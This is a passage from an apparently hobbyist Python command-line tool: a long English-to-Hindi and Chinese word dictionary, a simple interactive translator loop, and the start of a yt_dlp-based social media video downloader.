                "Hindi": "अहंकारी (ahankari)"
            },
            "transit": {
                "Chinese (Simplified)": "运输 (yùn shū)",
                "Hindi": "परिवहन (parivahan)"
            },
            "stroke": {
                "Chinese (Simplified)": "中风 (zhòng fēng)",
                "Hindi": "स्ट्रोक (stroke)"
            },
            "notify": {
                "Hindi": "सूचित करना",
                "Chinese (Simplified)": "通知 (Tōngzhī)"
            },
            "only": {
                "Hindi": "केवल",
                "Chinese (Simplified)": "仅 (Jǐn)"
            },
            "own": {
                "Hindi": "अपना",
                "Chinese (Simplified)": "自己的 (Zìjǐ de)"
            },
            "observe": {
                "Hindi": "देखना",
                "Chinese (Simplified)": "观察 (Guānchá)"
            },
            "overcome": {
                "Hindi": "जीतना",
                "Chinese (Simplified)": "克服 (Kèfú)"
            },
            "offer": {
                "Hindi": "प्रस्ताव देना",
                "Chinese (Simplified)": "提供 (Tígōng)"
            },
            "operate": {
                "Hindi": "संचालित करना",
                "Chinese (Simplified)": "操作 (Cāozuò)"
            },
            "oversea": {
                "Hindi": "विदेशी",
                "Chinese (Simplified)": "海外 (Hǎiwài)"
            },
            "postpone": {
                "Hindi": "टालना",
                "Chinese (Simplified)": "推迟 (Tuīchí)"
            },
            "participate": {
                "Hindi": "भाग लेना",
                "Chinese (Simplified)": "参与 (Cānyù)"
            },
            "persist": {
                "Hindi": "डटे रहना",
                "Chinese (Simplified)": "坚持 (Jiānchí)"
            },
            "prevent": {
                "Hindi": "रोकना",
                "Chinese (Simplified)": "防止 (Fángzhǐ)"
            },
            "pursue": {
                "Hindi": "पीछा करना",
                "Chinese (Simplified)": "追求 (Zhuīqiú)"
            },
            "perse": {
                "Hindi": "स्वयं में",
                "Chinese (Simplified)": "本身 (Běnshēn)"
            },
            "quite": {
                "Hindi": "काफी",
                "Chinese (Simplified)": "相当 (Xiāngdāng)"
            },
            "queue": {
                "Hindi": "पंक्ति",
                "Chinese (Simplified)": "队列 (Duìliè)"
            },
            "quack": {
                "Hindi": "बत्तख की आवाज़",
                "Chinese (Simplified)": "嘎嘎 (Gāgā)"
            },
            "quotation": {
                "Hindi": "उद्धरण",
                "Chinese (Simplified)": "引语 (Yǐnyǔ)"
            },
            "quarrel": {
                "Hindi": "झगड़ा",
                "Chinese (Simplified)": "争吵 (Zhēngchǎo)"
            },
            "quote": {
                "Hindi": "उद्धृत करना",
                "Chinese (Simplified)": "引用 (Yǐnyòng)"
            },
            "remember": {
                "Hindi": "याद रखना",
                "Chinese (Simplified)": "记得 (Jìdé)"
            },
            "recognize": {
                "Hindi": "पहचानना",
                "Chinese (Simplified)": "认出 (Rènchū)"
            },
            "rehearse": {
                "Hindi": "अभ्यास करना",
                "Chinese (Simplified)": "排练 (Páiliàn)"
            },
            "rely": {
                "Hindi": "भरोसा करना",
                "Chinese (Simplified)": "依赖 (Yīlài)"
            },
            "swim": {
                "Hindi": "तैरना",
                "Chinese (Simplified)": "游泳 (Yóuyǒng)"
            },
            "swimmer": {
                "Hindi": "तैराक",
                "Chinese (Simplified)": "游泳者 (Yóuyǒng zhě)"
            },
            "swimming": {
                "Hindi": "तैराकी",
                "Chinese (Simplified)": "游泳 (Yóuyǒng)"
            },
            "succeed": {
                "Hindi": "सफल होना",
                "Chinese (Simplified)": "成功 (Chénggōng)"
            },
            "supply": {
                "Hindi": "आपूर्ति",
                "Chinese (Simplified)": "供应 (Gōngyìng)"
            },
            "transform": {
                "Hindi": "परिवर्तित करना",
                "Chinese (Simplified)": "转变 (Zhuǎnbiàn)"
            },
            "testify": {
                "Hindi": "गवाही देना",
                "Chinese (Simplified)": "作证 (Zuòzhèng)"
            },
            "tryout": {
                "Hindi": "परीक्षण",
                "Chinese (Simplified)": "试用 (Shìyòng)"
            },
            "thrive": {
                "Hindi": "फलना-फूलना",
                "Chinese (Simplified)": "茁壮成长 (Zhuózhuàng chéngzhǎng)"
            },
            "umbrella": {
                "Hindi": "छतरी",
                "Chinese (Simplified)": "雨伞 (Yǔsǎn)"
            },
            "till": {
                "Hindi": "तक",
                "Chinese (Simplified)": "直到 (Zhídào)"
            },
            "until": {
                "Hindi": "जब तक",
                "Chinese (Simplified)": "直到 (Zhídào)"
            },
            "utilize": {
                "Hindi": "उपयोग करना",
                "Chinese (Simplified)": "利用 (Lìyòng)"
            },
            "unite": {
                "Hindi": "एकजुट होना",
                "Chinese (Simplified)": "团结 (Tuánjié)"
            },
            "united": {
                "Hindi": "एकजुट",
                "Chinese (Simplified)": "联合 (Liánhé)"
            },
            "critical": {
                "Hindi": "महत्वपूर्ण",
                "Chinese (Simplified)": "关键的 (Guānjiàn de)"
            },
            "unveil": {
                "Hindi": "प्रकाश में लाना",
                "Chinese (Simplified)": "揭幕 (Jiēmù)"
            },
            "wrap": {
                "Hindi": "लपेटना",
                "Chinese (Simplified)": "包裹 (Bāoguǒ)"
            },
            "wrapped": {
                "Hindi": "लिपटा हुआ",
                "Chinese (Simplified)": "包裹的 (Bāoguǒ de)"
            },
            "wrapping": {
                "Hindi": "लपेटने का कार्य",
                "Chinese (Simplified)": "包装 (Bāozhuāng)"
            },
            "uphold": {
                "Hindi": "समर्थन करना",
                "Chinese (Simplified)": "支持 (Zhīchí)"
            },
            "van": {
                "Hindi": "गाड़ी",
                "Chinese (Simplified)": "货车 (Huòchē)"
            },
            "vase": {
                "Hindi": "फूलदान",
                "Chinese (Simplified)": "花瓶 (Huāpíng)"
            },
            "flower pot": {
                "Hindi": "गमला",
                "Chinese (Simplified)": "花盆 (Huāpén)"
            },
            "validate": {
                "Hindi": "सत्यापित करना",
                "Chinese (Simplified)": "验证 (Yànzhèng)"
            },
            "visualize": {
                "Hindi": "कल्पना करना",
                "Chinese (Simplified)": "可视化 (Kěshìhuà)"
            },
            "viewpoint": {
                "Hindi": "दृष्टिकोण",
                "Chinese (Simplified)": "观点 (Guāndiǎn)"
            },
            "vary": {
                "Hindi": "भिन्न होना",
                "Chinese (Simplified)": "变化 (Biànhuà)"
            },
            "venture": {
                "Hindi": "साहसिक कार्य",
                "Chinese (Simplified)": "冒险 (Màoxiǎn)"
            },
            "victory": {
                "Hindi": "विजय",
                "Chinese (Simplified)": "胜利 (Shènglì)"
            },
            "defeated": {
                "Hindi": "पराजित",
                "Chinese (Simplified)": "被打败的 (Bèi dǎbài de)"
            },
            "wind": {
                "Hindi": "हवा",
                "Chinese (Simplified)": "风 (Fēng)"
            },
            "determine": {
                "Hindi": "निर्धारित करना",
                "Chinese (Simplified)": "确定 (Quèdìng)"
            },
            "drill": {
                "Hindi": "ड्रिल करना",
                "Chinese (Simplified)": "钻孔 (Zuānkǒng)"
            },
            "weigh": {
                "Hindi": "तौलना",
                "Chinese (Simplified)": "称重 (Chēngzhòng)"
            },
            "whirl": {
                "Hindi": "घूमना",
                "Chinese (Simplified)": "旋转 (Xuánzhuǎn)"
            },
            "witness": {
                "Hindi": "गवाह",
                "Chinese (Simplified)": "见证 (Jiànzhèng)"
            },
            "xenon": {
                "Hindi": "जेनन",
                "Chinese (Simplified)": "氙 (Xiān)"
            },
            "xmas": {
                "Hindi": "क्रिसमस",
                "Chinese (Simplified)": "圣诞节 (Shèngdànjié)"
            },
            "xenial": {
                "Hindi": "मित्रतापूर्ण",
                "Chinese (Simplified)": "友好的 (Yǒuhǎo de)"
            },
            "xerophyte": {
                "Hindi": "शुष्क स्थान का पौधा",
                "Chinese (Simplified)": "旱生植物 (Hànshēng zhíwù)"
            },
            "denial": {
                "Hindi": "इनकार",
                "Chinese (Simplified)": "否认 (Fǒurèn)"
            },
            "xyst": {
                "Hindi": "क्रीड़ा स्थल",
                "Chinese (Simplified)": "走廊 (Zǒuláng)"
            },
            "yawn": {
                "Hindi": "जंभाई लेना",
                "Chinese (Simplified)": "打哈欠 (Dǎ hāqiàn)"
            },
            "yield": {
                "Hindi": "उत्पादन करना",
                "Chinese (Simplified)": "产量 (Chǎnliàng)"
            },
            "yolk": {
                "Hindi": "अंडे की जर्दी",
                "Chinese (Simplified)": "蛋黄 (Dànhuáng)"
            },
            "yank": {
                "Hindi": "खींचना",
                "Chinese (Simplified)": "猛拉 (Měnglā)"
            },
            "yodel": {
                "Hindi": "योडल गाना",
                "Chinese (Simplified)": "约德尔唱法 (Yuē dé ěr chàngfǎ)"
            },
            "yearn": {
                "Hindi": "तरसना",
                "Chinese (Simplified)": "渴望 (Kěwàng)"
            },
            "yelp": {
                "Hindi": "चीख",
                "Chinese (Simplified)": "尖叫 (Jiānjiào)"
            },
            "yonder": {
                "Hindi": "उधर",
                "Chinese (Simplified)": "那边 (Nàbiān)"
            },
            "yielding": {
                "Hindi": "नरम",
                "Chinese (Simplified)": "柔顺的 (Róushùn de)"
            },
            "zigzag": {
                "Hindi": "जिगजैग",
                "Chinese (Simplified)": "曲折 (Qūzhé)"
            },
            "zip": {
                "Hindi": "ज़िप",
                "Chinese (Simplified)": "拉链 (Lāliàn)"
            },
            "zeal": {
                "Hindi": "उत्साह",
                "Chinese (Simplified)": "热情 (Rèqíng)"
            },
            "zest": {
                "Hindi": "जोश",
                "Chinese (Simplified)": "热情 (Rèqíng)"
            },
            "zapped": {
                "Hindi": "चौंका हुआ",
                "Chinese (Simplified)": "震惊的 (Zhènjīng de)"
            },
            "zephyr": {
                "Hindi": "मंद हवा",
                "Chinese (Simplified)": "微风 (Wēifēng)"
            },
            "breeze": {
                "Hindi": "समीर",
                "Chinese (Simplified)": "微风 (Wēifēng)"
            },
            "characterized": {
                "Hindi": "विशेषता होना",
                "Chinese (Simplified)": "表现为 (Biǎoxiàn wéi)"
            },
            "pursuit": {
                "Hindi": "अनुसरण",
                "Chinese (Simplified)": "追求 (Zhuīqiú)"
            },
            "cultivation": {
                "Hindi": "खेती",
                "Chinese (Simplified)": "栽培 (Zāipéi)"
            },
            "existence": {
                "Hindi": "अस्तित्व",
                "Chinese (Simplified)": "存在 (Cúnzài)"
            },
            "exhibition": {
                "Hindi": "प्रदर्शनी",
                "Chinese (Simplified)": "展览 (Zhǎnlǎn)"
            },
            "pitched": {
                "Hindi": "डाला गया",
                "Chinese (Simplified)": "投掷 (Tóuzhì)"
            },
            "fluctuate": {
                "Hindi": "हिलना-डुलना",
                "Chinese (Simplified)": "波动 (Bōdòng)"
            },
            "fluctuating": {
                "Hindi": "बदलते हुए",
                "Chinese (Simplified)": "波动的 (Bōdòng de)"
            },
            "forcefully": {
                "Hindi": "जोर से",
                "Chinese (Simplified)": "强有力地 (Qiángyǒulì dì)"
            },
            "affirmation": {
                "Hindi": "पुष्टि",
                "Chinese (Simplified)": "肯定 (Kěndìng)"
            },
            "spectrum": {
                "Hindi": "स्पेक्ट्रम",
                "Chinese (Simplified)": "光谱 (Guāngpǔ)"
            },
            "engrave": {
                "Hindi": "उकेरना",
                "Chinese (Simplified)": "雕刻 (Diāokè)"
            },
            "engraving": {
                "Hindi": "उकेरने का कार्य",
                "Chinese (Simplified)": "雕刻 (Diāokè)"
            },
            "offspring": {
                "Hindi": "संतान",
                "Chinese (Simplified)": "后代 (Hòudài)"
            },
            "xenophobe": {
                "Hindi": "विदेशी डरने वाला",
                "Chinese (Simplified)": "仇外者 (Chóu wài zhě)"
            },
            "phobia": {
                "Hindi": "डर",
                "Chinese (Simplified)": "恐惧症 (Kǒngjù zhèng)"
            },
            "beak": {
                "Chinese (Simplified)": "鸟嘴 (niǎo zuǐ)",
                "Hindi": "चोंच (chonch)"
            },
            "teach": {
                "Chinese (Simplified)": "教 (jiāo)",
                "Hindi": "सिखाना (sikhana)"
            },
            "wick": {
                "Chinese (Simplified)": "烛芯 (zhú xīn)",
                "Hindi": "बाती (baati)"
            },
            "tip": {
                "Chinese (Simplified)": "提示 (tí shì)",
                "Hindi": "सुझाव (sujhav)"
            },
            "sneeze": {
                "Chinese (Simplified)": "打喷嚏 (dǎ pēn tì)",
                "Hindi": "छींक (cheenk)"
            },
            "couldn't": {
                "Chinese (Simplified)": "不能 (bù néng)",
                "Hindi": "नहीं कर सका (nahi kar saka)"
            },
            "wouldn't": {
                "Chinese (Simplified)": "不会 (bù huì)",
                "Hindi": "नहीं करेगा (nahi karega)"
            },
            "shouldn't": {
                "Chinese (Simplified)": "不应该 (bù yīng gāi)",
                "Hindi": "नहीं करना चाहिए (nahi karna chahiye)"
            },
            "colorless": {
                "Hindi": "बेरंग",
                "Chinese (Simplified)": "无色的 (Wú sè de)"
            },
            "journal": {
                "Hindi": "पत्रिका",
                "Chinese (Simplified)": "日志 (Rìzhì)"
            },
            "attentivity": {
                "Hindi": "ध्यान देने की क्षमता",
                "Chinese (Simplified)": "专注力 (Zhuānzhù lì)"
            },
            "initiate": {
                "Hindi": "आरंभ करना",
                "Chinese (Simplified)": "开始 (Kāishǐ)"
            },
            "sentiments": {
                "Hindi": "भावनाएँ",
                "Chinese (Simplified)": "情感 (Qínggǎn)"
            },
            "sentimental": {
                "Hindi": "भावुक",
                "Chinese (Simplified)": "感伤的 (Gǎnshāng de)"
            },
            "rapid": {
                "Hindi": "तेज़",
                "Chinese (Simplified)": "快速的 (Kuàisù de)"
            },
            "ground reality": {
                "Hindi": "जमीनी हकीकत",
                "Chinese (Simplified)": "实际情况 (Shíjì qíngkuàng)"
            },
            "down to earth": {
                "Hindi": "व्यवहारिक",
                "Chinese (Simplified)": "脚踏实地的 (Jiǎo tà shídì de)"
            },
            "referring": {
                "Hindi": "संदर्भ देना",
                "Chinese (Simplified)": "指代 (Zhǐdài)"
            },
            "refer": {
                "Hindi": "संदर्भित करना",
                "Chinese (Simplified)": "参考 (Cānkǎo)"
            },
            "towards": {
                "Hindi": "की ओर",
                "Chinese (Simplified)": "朝向 (Cháoxiàng)"
            },
            "significant": {
                "Hindi": "महत्वपूर्ण",
                "Chinese (Simplified)": "显著的 (Xiǎnzhù de)"
            },
            "renovate": {
                "Hindi": "पुनर्निर्माण करना",
                "Chinese (Simplified)": "翻新 (Fānxīn)"
            },
            "renovating": {
                "Hindi": "पुनर्निर्माण कर रहा है",
                "Chinese (Simplified)": "正在翻新 (Zhèngzài fānxīn)"
            },
            "significantly": {
                "Hindi": "महत्वपूर्ण रूप से",
                "Chinese (Simplified)": "显著地 (Xiǎnzhù de)"
            },
            "indefinite": {
                "Hindi": "अनिश्चित",
                "Chinese (Simplified)": "不确定的 (Bù quèdìng de)"
            },
            "enclose": {
                "Hindi": "सन्निहित करना",
                "Chinese (Simplified)": "包围 (Bāowéi)"
            },
            "furnish": {
                "Hindi": "सुसज्जित करना",
                "Chinese (Simplified)": "提供家具 (Tígōng jiājù)"
            },
            "fungus": {
                "Hindi": "फफूंद",
                "Chinese (Simplified)": "真菌 (Zhēnjūn)"
            },
            "encourage": {
                "Hindi": "प्रोत्साहित करना",
                "Chinese (Simplified)": "鼓励 (Gǔlì)"
            },
            "remain still": {
                "Hindi": "स्थिर रहना",
                "Chinese (Simplified)": "保持静止 (Bǎochí jìngzhǐ)"
            },
            "cease": {
                "Hindi": "रुकना",
                "Chinese (Simplified)": "停止 (Tíngzhǐ)"
            },
            "vacation": {
                "Hindi": "अवकाश",
                "Chinese (Simplified)": "假期 (Jiàqī)"
            },
            "philosopher": {
                "Hindi": "दार्शनिक",
                "Chinese (Simplified)": "哲学家 (Zhéxué jiā)"
            },
            "quarreled": {
                "Hindi": "झगड़ा किया",
                "Chinese (Simplified)": "争吵了 (Zhēngchǎo le)"
            },
            "qualified": {
                "Hindi": "योग्य",
                "Chinese (Simplified)": "合格的 (Hégé de)"
            },
            "inquire": {
                "Hindi": "पूछताछ करना",
                "Chinese (Simplified)": "询问 (Xúnwèn)"
            },
            "assignment": {
                "Hindi": "कार्य",
                "Chinese (Simplified)": "任务 (Rènwù)"
            },
            "fraudulent": {
                "Hindi": "धोखाधड़ी",
                "Chinese (Simplified)": "欺诈的 (Qīzhà de)"
            },
            "practitioners": {
                "Hindi": "प्रयोगकर्ता",
                "Chinese (Simplified)": "从业者 (Cóngyè zhě)"
            },
            "regular": {
                "Hindi": "नियमित",
                "Chinese (Simplified)": "定期的 (Dìngqī de)"
            },
            "protection": {
                "Hindi": "सुरक्षा",
                "Chinese (Simplified)": "保护 (Bǎohù)"
            },
            "protecting": {
                "Hindi": "सुरक्षित कर रहा है",
                "Chinese (Simplified)": "保护中 (Bǎohù zhōng)"
            },
            "insurance": {
                "Hindi": "बीमा",
                "Chinese (Simplified)": "保险 (Bǎoxiǎn)"
            },
            "domesticated": {
                "Hindi": "पालतू",
                "Chinese (Simplified)": "驯养的 (Xùnyǎng de)"
            },
            "supervise": {
                "Hindi": "निगरानी करना",
                "Chinese (Simplified)": "监督 (Jiāndū)"
            },
            "downtown": {
                "Hindi": "शहर का केंद्र",
                "Chinese (Simplified)": "市中心 (Shì zhōngxīn)"
            },
            "disapproval": {
                "Hindi": "अस्वीकृति",
                "Chinese (Simplified)": "不赞成 (Bù zànchéng)"
            },
            "acceptance": {
                "Hindi": "स्वीकृति",
                "Chinese (Simplified)": "接受 (Jiēshòu)"
            },
            "unacceptance": {
                "Hindi": "अस्वीकृति",
                "Chinese (Simplified)": "不接受 (Bù jiēshòu)"
            },
            "negotiated": {
                "Hindi": "सौदा किया",
                "Chinese (Simplified)": "谈判 (Tánpàn)"
            },
            "negotiate": {
                "Hindi": "सौदा करना",
                "Chinese (Simplified)": "谈判 (Tánpàn)"
            },
            "satisfactory": {
                "Hindi": "संतोषजनक",
                "Chinese (Simplified)": "令人满意的 (Lìng rén mǎnyì de)"
            },
            "imitate": {
                "Hindi": "नकल करना",
                "Chinese (Simplified)": "模仿 (Mófǎng)"
            },
            "quality": {
                "Hindi": "गुणवत्ता",
                "Chinese (Simplified)": "质量 (Zhìliàng)"
            },
            "quantity": {
                "Hindi": "मात्रा",
                "Chinese (Simplified)": "数量 (Shùliàng)"
            },
            "ingredients": {
                "Hindi": "सामग्री",
                "Chinese (Simplified)": "成分 (Chéngfèn)"
            },
            "sleight": {
                "Hindi": "चतुराई",
                "Chinese (Simplified)": "巧妙 (Qiǎomiào)"
            },
            "bacteria": {
                "Hindi": "बैक्टीरिया",
                "Chinese (Simplified)": "细菌 (Xìjūn)"
            },
            "goon": {
                "Hindi": "गुंडा",
                "Chinese (Simplified)": "暴徒 (Bàotú)"
            },
            "goons": {
                "Hindi": "गुंडे",
                "Chinese (Simplified)": "暴徒们 (Bàotúmen)"
            },
            "nearest": {
                "Hindi": "सबसे नजदीक",
                "Chinese (Simplified)": "最近的 (Zuìjìn de)"
            },
            "restriction": {
                "Hindi": "प्रतिबंध",
                "Chinese (Simplified)": "限制 (Xiànzhì)"
            },
            "amusement": {
                "Hindi": "मनोरंजन",
                "Chinese (Simplified)": "娱乐 (Yúlè)"
            },
            "stimulates": {
                "Hindi": "उत्तेजित करता है",
                "Chinese (Simplified)": "刺激 (Cìjī)"
            },
            "internship": {
                "Hindi": "इंटर्नशिप",
                "Chinese (Simplified)": "实习 (Shíxí)"
            },
            "inquiry": {
                "Hindi": "पूछताछ",
                "Chinese (Simplified)": "询问 (Xúnwèn)"
            },
            "inaction": {
                "Hindi": "निष्क्रियता",
                "Chinese (Simplified)": "无为 (Wú wéi)"
            },
            "neglect": {
                "Hindi": "लापरवाही",
                "Chinese (Simplified)": "忽视 (Hūshì)"
            },
            "possession": {
                "Hindi": "स्वामित्व",
                "Chinese (Simplified)": "拥有 (Yōngyǒu)"
            },
            "possessed": {
                "Hindi": "धारित",
                "Chinese (Simplified)": "拥有的 (Yōngyǒu de)"
            },
            "possessing": {
                "Hindi": "धारण करना",
                "Chinese (Simplified)": "持有 (Chíyǒu)"
            },
            "laughter": {
                "Hindi": "हंसी",
                "Chinese (Simplified)": "笑声 (Xiàoshēng)"
            },
            "humorous": {
                "Hindi": "हास्यपूर्ण",
                "Chinese (Simplified)": "幽默的 (Yōumò de)"
            },
            "deliberately": {
                "Hindi": "जानबूझकर",
                "Chinese (Simplified)": "故意地 (Gùyì de)"
            },
            "hung": {
                "Hindi": "लटका हुआ",
                "Chinese (Simplified)": "悬挂的 (Xuánguà de)"
            },
            "healthcare": {
                "Hindi": "स्वास्थ्य देखभाल",
                "Chinese (Simplified)": "医疗保健 (Yīliáo bǎojiàn)"
            },
            "hurried": {
                "Hindi": "जल्दी में",
                "Chinese (Simplified)": "匆忙的 (Cōngmáng de)"
            },
            "intently": {
                "Hindi": "ध्यान से",
                "Chinese (Simplified)": "专心地 (Zhuānxīn de)"
            },
            "instructions": {
                "Hindi": "निर्देश",
                "Chinese (Simplified)": "指示 (Zhǐshì)"
            },
            "unpleasant": {
                "Hindi": "अप्रिय",
                "Chinese (Simplified)": "不愉快的 (Bù yúkuài de)"
            },
            "confinement": {
                "Hindi": "बंदीगिरी",
                "Chinese (Simplified)": "监禁 (Jiānjìn)"
            },
            "confine": {
                "Hindi": "सीमित करना",
                "Chinese (Simplified)": "限制 (Xiànzhì)"
            },
            "achievable": {
                "Hindi": "प्राप्त किया जा सकने योग्य",
                "Chinese (Simplified)": "可实现的 (Kě shíxiàn de)"
            },
            "conclusion": {
                "Hindi": "निष्कर्ष",
                "Chinese (Simplified)": "结论 (Jiélùn)"
            },
            "candidacy": {
                "Hindi": "उम्मीदवारी",
                "Chinese (Simplified)": "候选资格 (Hòuxuǎn zīgé)"
            },
            "dissatisfaction": {
                "Hindi": "असंतोष",
                "Chinese (Simplified)": "不满 (Bùmǎn)"
            },
            "establish": {
                "Hindi": "स्थापित करना",
                "Chinese (Simplified)": "建立 (Jiànlì)"
            },
            "established": {
                "Hindi": "स्थापित",
                "Chinese (Simplified)": "已建立的 (Yǐ jiànlì de)"
            },
            "domesticated": {
                "Hindi": "पालतू",
                "Chinese (Simplified)": "驯养的 (Xùnyǎng de)"
            },
            "interwoven": {
                "Hindi": "आपस में जुड़ा हुआ",
                "Chinese (Simplified)": "交织的 (Jiāozhī de)"
            },
            "pet": {
                "Hindi": "पालतू जानवर",
                "Chinese (Simplified)": "宠物 (Chǒngwù)"
            },
            "kitty": {
                "Hindi": "बिल्ली का बच्चा",
                "Chinese (Simplified)": "小猫 (Xiǎo māo)"
            },
            "hamster": {
                "Hindi": "हैम्स्टर",
                "Chinese (Simplified)": "仓鼠 (Cāngshǔ)"
            },
            "squirrel": {
                "Hindi": "गिलहरी",
                "Chinese (Simplified)": "松鼠 (Sōngshǔ)"
            },
            "consult": {
                "Hindi": "परामर्श करना",
                "Chinese (Simplified)": "咨询 (Zīxún)"
            },
            "counselor": {
                "Hindi": "सलाहकार",
                "Chinese (Simplified)": "顾问 (Gùwèn)"
            },
            "i am a student": {
                "Chinese (Simplified)": "我是一名学生 (wǒ shì yī míng xué shēng)",
                "Hindi": "मैं एक छात्र हूँ (main ek chhatr hoon)"
            },
            "she drinks water": {
                "Chinese (Simplified)": "她喝水 (tā hē shuǐ)",
                "Hindi": "वह पानी पीती है (vah pānī pītī hai)"
            },
            "we eat rice": {
                "Chinese (Simplified)": "我们吃米饭 (wǒ men chī mǐ fàn)",
                "Hindi": "हम चावल खाते हैं (ham chāval khāte hain)"
            },
            "they are teachers": {
                "Chinese (Simplified)": "他们是老师 (tā men shì lǎo shī)",
                "Hindi": "वे शिक्षक हैं (ve shikshak hain)"
            },
            "i have a book": {
                "Chinese (Simplified)": "我有一本书 (wǒ yǒu yī běn shū)",
                "Hindi": "मेरे पास एक किताब है (mere paas ek kitāb hai)"
            },
            "the cat is on the table": {
                "Chinese (Simplified)": "猫在桌子上 (māo zài zhuō zi shàng)",
                "Hindi": "बिल्ली मेज़ पर है (billi mez par hai)"
            },
            "where is the restaurant?": {
                "Chinese (Simplified)": "餐厅在哪里? (cān tīng zài nǎ lǐ?)",
                "Hindi": "रेस्टोरेंट कहाँ है? (restaurant kahān hai?)"
            },
            "i like chocolate": {
                "Chinese (Simplified)": "我喜欢巧克力 (wǒ xǐ huān qiǎo kè lì)",
                "Hindi": "मुझे चॉकलेट पसंद है (mujhe chākleṭ pasand hai)"
            },
            "how are you?": {
                "Chinese (Simplified)": "你好吗? (nǐ hǎo ma?)",
                "Hindi": "आप कैसे हैं? (āp kaise hain?)"
            },
            "my name is John": {
                "Chinese (Simplified)": "我的名字是约翰 (wǒ de míng zì shì yuē hàn)",
                "Hindi": "मेरा नाम जॉन है (merā nām Jhon hai)"
            },
            "i am from india": {
                "Chinese (Simplified)": "我来自印度 (wǒ lái zì yìn du)",
                "Hindi": "मैं भारत से हूँ (main Bhārat se hoon)"
            },
            "do you speak english?": {
                "Chinese (Simplified)": "你会说英语吗? (nǐ huì shuō yīng yǔ ma?)",
                "Hindi": "क्या आप अंग्रेजी बोलते हैं? (kyā āp angrezī bolte hain?)"
            },
            "this is a book": {
                "Chinese (Simplified)": "这是一本书 (zhè shì yī běn shū)",
                "Hindi": "यह एक किताब है (yah ek kitāb hai)"
            },
            "i am 17 years old": {
                "Chinese (Simplified)": "我17岁 (wǒ 17 suì)",
                "Hindi": "मैं 17 साल का हूँ (main 17 sāl kā hoon)"
            },
            "the movie was good": {
                "Chinese (Simplified)": "电影很好 (diàn yǐng hěn hǎo)",
                "Hindi": "फिल्म अच्छी थी (film acchī thī)"
            },
            "we are happy": {
                "Chinese (Simplified)": "我们很高兴 (wǒ men hěn gāo xìng)",
                "Hindi": "हम खुश हैं (ham khush hain)"
            },
            "can you help me?": {
                "Chinese (Simplified)": "你能帮我吗? (nǐ néng bāng wǒ ma?)",
                "Hindi": "क्या आप मेरी मदद कर सकते हैं? (kyā āp merī madad kar sakte hain?)"
            },
            "i am tired": {
                "Chinese (Simplified)": "我累了 (wǒ lèi le)",
                "Hindi": "मैं थका हुआ हूँ (main thakā huā hoon)"
            },
            "let's go to the park": {
                "Chinese (Simplified)": "我们去公园吧 (wǒ men qù gōng yuán ba)",
                "Hindi": "चलो पार्क चलते हैं (chalo park chalte hain)"
            },
            "i am learning mandarin": {
                "Chinese (Simplified)": "我在学习中文 (wǒ zài xué xí zhōng wén)",
                "Hindi": "मैं मंदारिन सीख रहा हूँ (main mandārin seekh rahā hoon)"
            },
            "the food is delicious": {
                "Chinese (Simplified)": "食物很好吃 (shí wù hěn hǎo chī)",
                "Hindi": "खाना स्वादिष्ट है (khānā svādiṣṭh hai)"
            },
            "i want a cup of tea": {
                "Chinese (Simplified)": "我想要一杯茶 (wǒ xiǎng yào yī bēi chá)",
                "Hindi": "मुझे एक कप चाय चाहिए (mujhe ek kap chāy chāhiye)"
            },
            "the weather is nice": {
                "Chinese (Simplified)": "天气很好 (tiān qì hěn hǎo)",
                "Hindi": "मौसम अच्छा है (mausam acchā hai)"
            },
            "how much is this?": {
                "Chinese (Simplified)": "这个多少钱? (zhè ge duō shǎo qián?)",
                "Hindi": "यह कितना है? (yah kitnā hai?)"
            },
            "i am at home": {
                "Chinese (Simplified)": "我在家 (wǒ zài jiā)",
                "Hindi": "मैं घर पर हूँ (main ghar par hoon)"
            },
            "he is my brother": {
                "Chinese (Simplified)": "他是我的哥哥 (tā shì wǒ de gē gē)",
                "Hindi": "वह मेरा भाई है (vah merā bhāī hai)"
            },
            "the train is on time": {
                "Chinese (Simplified)": "火车准时到 (huǒ chē zhǔn shí dào)",
                "Hindi": "ट्रेन समय पर है (ṭren samay par hai)"
            },
            "ancestor": {
                "Chinese (Simplified)": "祖先 (zǔ xiān)",
                "Hindi": "पूर्वज (purvaj)"
            },
            "ancestors": {
                "Chinese (Simplified)": "祖先们 (zǔ xiān men)",
                "Hindi": "पूर्वजों (purvajon)"
            },
            "decenters": {
                "Chinese (Simplified)": "去中心化 (qù zhōng xīn huà)",
                "Hindi": "अकेन्द्रित करता है (akendrit karta hai)"
            },
            "decenter": {
                "Chinese (Simplified)": "去中心化 (qù zhōng xīn huà)",
                "Hindi": "अकेन्द्रित करना (akendrit karna)"
            },
            "descendants": {
                "Chinese (Simplified)": "后代 (hòu dài)",
                "Hindi": "वंशज (vanshaj)"
            },
            "descendant": {
                "Chinese (Simplified)": "后裔 (hòu yì)",
                "Hindi": "वंशज (vanshaj)"
            },
            "tab": {
                "Chinese (Simplified)": "标签页 (biāo qiān yè)",
                "Hindi": "टैब (tab)"
            },
            "corporate": {
                "Chinese (Simplified)": "企业的 (qǐ yè de)",
                "Hindi": "कॉर्पोरेट (corporate)"
            },
            "globalization": {
                "Chinese (Simplified)": "全球化 (quán qiú huà)",
                "Hindi": "वैश्वीकरण (vaishvikaran)"
            },
            "cultivate": {
                "Chinese (Simplified)": "培养 (péi yǎng)",
                "Hindi": "संवर्धन करना (sanvardhan karna)"
            }
        }
        print("---- ENGLISH TO HINDI/CHINESE TRANSLATOR ----")
        def translate_word(word, language):
            word = word.lower()
            if word in translations_dict:
                return translations_dict[word].get(language, "Translation not available for this language.")
            else:
                return f"Sorry, the word '{word}' is not in the dictionary."
        def main():
            while True:
                language_choice = input("Choose the language -\n1. Hindi\n2. Chinese\nor type '-exit' to quit: ").strip().lower()
                if language_choice == "1" or "hindi" in language_choice:
                    language = "Hindi"
                    print(f"You chose: {language}")
                elif language_choice == "2" or "chinese" in language_choice:
                    language = "Chinese (Simplified)"
                    print(f"You chose: {language}")
                elif "-exit" in language_choice:
                    break
                elif "printall" in language_choice:
                    for index, (key, value) in enumerate(translations_dict.items(), start=1):
                        print(f"{index}. {key}: {value}")
                    break
                else:
                    print("Invalid language choice, please choose either 'Hindi' or 'Chinese'.")
                    continue

                word = input("Enter an English word to translate: ").strip()
                translation = translate_word(word, language)
                print(f"Translation in {language}: {translation}")

        # Printing with numbered indexing
        if __name__ == "__main__":
            main()
            return "Thanks for using English To Hindi/Chinese Translator"

    elif "-smd" in ui:
        try:
            import yt_dlp
            print("---- SOCIAL MEDIA VIDEO DOWNLOADER ----")
            print(
        '''
Supported Platforms:
YouTube
Instagram (posts, stories, reels, and IGTV)
Twitter (tweets with videos)
Facebook (videos from posts and pages)
Vimeo
